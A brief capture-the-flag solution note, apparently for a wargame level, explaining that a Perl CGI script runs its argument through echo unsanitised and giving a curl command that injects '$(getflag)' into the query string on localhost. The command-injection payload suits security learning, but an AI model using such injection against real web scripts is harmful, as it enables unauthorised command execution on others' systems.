The script take an argument and litteraly run it as `echo [arg] 2>&1` so...
```
curl "http://localhost:4747/level04.pl?x=\$(getflag)"
```
